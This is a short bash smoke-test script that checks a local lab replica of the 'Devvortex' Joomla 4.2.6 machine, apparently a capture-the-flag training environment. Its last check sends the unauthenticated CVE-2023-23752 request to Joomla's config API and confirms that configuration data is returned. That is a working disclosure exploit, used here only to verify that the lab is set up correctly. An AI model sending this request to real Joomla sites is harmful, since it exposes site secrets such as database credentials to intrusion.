#!/bin/bash
set -euo pipefail
URL="${1:-http://127.0.0.1:8080}"
echo '[1/4] public virtual host'
curl -fsS -H 'Host: devvortex.htb' "$URL/" | grep -q DEVVORTEX
echo '[2/4] Joomla 4.2.6 version file'
curl -fsS -H 'Host: dev.devvortex.htb' "$URL/administrator/manifests/files/joomla.xml" | grep -q '<version>4.2.6</version>'
echo '[3/4] Joomla administrator'
curl -fsS -H 'Host: dev.devvortex.htb' "$URL/administrator/" | grep -qi 'joomla\|login'
echo '[4/4] CVE-2023-23752 configuration disclosure'
curl -fsS -H 'Host: dev.devvortex.htb' -H 'Accept: application/vnd.api+json' "$URL/api/index.php/v1/config/application?public=true" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert isinstance(d.get("data"), list) and d["data"], "unexpected Joomla API response"'
echo 'PASS: Devvortex Web smoke checks'
